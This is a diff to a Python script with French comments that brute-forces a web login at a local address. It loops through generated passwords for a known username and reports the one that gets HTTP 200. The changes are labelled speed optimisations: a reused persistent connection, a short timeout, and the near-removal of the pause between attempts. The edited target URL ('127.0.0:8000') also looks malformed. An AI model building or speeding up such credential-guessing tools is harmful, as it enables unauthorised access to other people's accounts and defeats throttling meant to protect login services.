@@ -10,18 +10,20 @@ import itertools # Générer combinaisons
 
 CHARGEMENT = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
 
-async def send_request(username: str, password: str) -> int: # renvoie un entier
-    url = "http://127.0.0.1:8000/login"
+# OPTIMISATION : On passe l'argument 'client' pour réutiliser la session TCP permanente
+async def send_request(client: httpx.AsyncClient, username: str, password: str) -> int: # renvoie un entier
+    url = "http://127.0.0:8000/login"
     donnees = {                                                                                  
         "username": username,                                                    
         "password": password                                                           
     }
     
-    # Création du client asynchrone httpx
-    async with httpx.AsyncClient() as client:
-        reponse = await client.post(url, data=donnees)
-        statut = reponse.status_code                                                
-        return statut
+    try:
+        # Un timeout court (2.0s) évite au script de rester bloqué sur une requête perdue
+        reponse = await client.post(url, data=donnees, timeout=2.0)
+        return reponse.status_code
+    except Exception:
+        return 0 # Gère les micro-coupures réseau sans faire planter le script
 
 # Fonction pour générer les mots de passe un par un
 def search_password():
@@ -55,60 +57,64 @@ async def main():
     # Initialisation de notre générateur de mots de passe
     moteur_de_recherche = search_password()
     
-    while True:
-        try:
-            # Récupération du prochain mot de passe à tester
-            # next() demande au générateur de nous donner la combinaison suivante
+    # OPTIMISATION MAJEURE : On ouvre LE client unique AVANT la boucle
+    # Toutes les requêtes vont partager ce tunnel, multipliant la vitesse par 5 ou 10
+    async with httpx.AsyncClient() as client:
+        while True:
             try:
-                password_actuel = next(moteur_de_recherche)
-            except StopIteration:
-                print("\n❌ Toutes les combinaisons possibles ont été testées.")
-                break
+                # Récupération du prochain mot de passe à tester
+                # next() demande au générateur de nous donner la combinaison suivante
+                try:
+                    password_actuel = next(moteur_de_recherche)
+                except StopIteration:
+                    print("\n❌ Toutes les combinaisons possibles ont été testées.")
+                    break
 
-            # Gestion de l'animation graphique sur une seule ligne
-            symbole = CHARGEMENT[compteur_animation % len(CHARGEMENT)]
-            tentatives += 1
-        
-            # On affiche le mot de passe en cours de test dans l'animation
-            sys.stdout.write(f"\r{symbole} Test : [{password_actuel}]... Tentative n°{tentatives}")
-            sys.stdout.flush()
-            compteur_animation += 1
+                # Gestion de l'animation graphique sur une seule ligne
+                symbole = CHARGEMENT[compteur_animation % len(CHARGEMENT)]
+                tentatives += 1
             
-            # Exécution de la requête réseau avec le mot de passe généré
-            statut = await send_request(username=USERNAME_CONNU, password=password_actuel)
-            
-            # Petite pause réglementaire (évite la saturation)
-            await asyncio.sleep(0.1) 
-            
-            # Analyse et traitement des statuts HTTP reçus
-            if statut == 200:      
-                sys.stdout.write("\r" + " " * 60 + "\r")  # Efface l'animation courante                                                                    
-                print(f"✅ tentatives : {tentatives}")
-                print(f"👤 Login : {USERNAME_CONNU}")
-                print(f"🔑 MDP   : {password_actuel}")
-                break # Succès complet : on coupe la boucle
-              
-            elif statut == 404: 
-                sys.stdout.write("\r" + " " * 60 + "\r")
-                print('❌ Erreur 404 : L\'adresse cible est introuvable.')                                                                         
-                break                 
+                # On affiche le mot de passe en cours de test dans l'animation
+                sys.stdout.write(f"\r{symbole} Test : [{password_actuel}]... Tentative n°{tentatives}")
+                sys.stdout.flush()
+                compteur_animation += 1
                 
-            elif statut == 401:                                                   
-                pass # Identifiants incorrects : l'animation continue au prochain mot de passe          
+                # Exécution de la requête réseau avec le client persistant
+                statut = await send_request(client=client, username=USERNAME_CONNU, password=password_actuel)
                 
-            elif statut == 403:
-                sys.stdout.write("\r" + " " * 60 + "\r")
-                print('🔒 Erreur 403 : Accès interdit (IP bloquée ou pare-feu)')
-                break                                      
+                # OPTIMISATION VITESSE : On retire la grosse pause de 0.1s. 
+                # On met un sleep quasi invisible pour laisser le processeur respirer sans brider la vitesse réseau.
+                await asyncio.sleep(0.001) 
                 
-            else:                                                                                        
+                # Analyse et traitement des statuts HTTP reçus
+                if statut == 200:      
+                    sys.stdout.write("\r" + " " * 60 + "\r")  # Efface l'animation courante                                                                    
+                    print(f"✅ tentatives : {tentatives}")
+                    print(f"👤 Login : {USERNAME_CONNU}")
+                    print(f"🔑 MDP   : {password_actuel}")
+                    break # Succès complet : on coupe la boucle
+                  
+                elif statut == 404: 
+                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    print('❌ Erreur 404 : L\'adresse cible est introuvable.')                                                                         
+                    break                 
+                    
+                elif statut == 401:                                                   
+                    pass # Identifiants incorrects : l'animation continue au prochain mot de passe          
+                    
+                elif statut == 403:
+                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    print('🔒 Erreur 403 : Accès interdit (IP bloquée ou pare-feu)')
+                    break                                      
+                    
+                else:                                                                                        
+                    sys.stdout.write("\r" + " " * 60 + "\r")
+                    print(f"⚠️ Autre code reçu : {statut}")   
+                    await asyncio.sleep(2)
+                              
+            except Exception as e:
                 sys.stdout.write("\r" + " " * 60 + "\r")
-                print(f"⚠️ Autre code reçu : {statut}")   
-                await asyncio.sleep(2)
-                          
-        except Exception as e:
-            sys.stdout.write("\r" + " " * 60 + "\r")
-            print(f"Erreur réseau détectée : {e}")
-            await asyncio.sleep(10)
+                print(f"Erreur réseau détectée : {e}")
+                await asyncio.sleep(10)
 
 asyncio.run(main())
